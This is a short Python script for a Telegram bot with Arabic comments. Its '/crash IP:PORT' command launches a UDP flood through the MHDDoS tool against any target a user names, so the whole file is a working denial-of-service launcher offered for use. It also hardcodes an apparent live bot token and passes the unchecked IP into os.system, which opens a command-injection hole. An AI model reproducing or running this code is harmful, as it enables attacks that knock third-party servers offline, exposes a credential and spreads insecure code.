import telebot
import os

# هنا حط التوكن تاع البوت تاعك
TOKEN = "7109397811:AAGGULNr7b8I0ldq5DS4NJytZ7RSRyF389k"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        # نحصل على النص اللي بعد /crash
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "رجاءً أكتب الأمر بالشكل الصحيح: /crash <IP>:<PORT>")
            return

        ip_port = command_parts[1]
        # التحقق من الشكل الصحيح لـ IP:PORT
        if ':' not in ip_port:
            bot.reply_to(message, "الشكل غير صحيح! لازم تكتب IP:PORT بالشكل الصحيح.")
            return

        # فصل الـ IP عن الـ PORT
        ip, port = ip_port.split(':')
        if not ip or not port.isdigit():
            bot.reply_to(message, "الشكل غير صحيح! تأكد من الـ IP والـ PORT.")
            return

        # تحضير الأمر لتشغيل السكريبت
        command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 999'
        os.system(command)

        # الرد على المستخدم بالرسالة المطلوبة
        response_message = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
        bot.reply_to(message, response_message)
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

# تشغيل البوت
if __name__ == "__main__":
    print("بوت تليجرام راهو يخدم...")
    bot.polling()
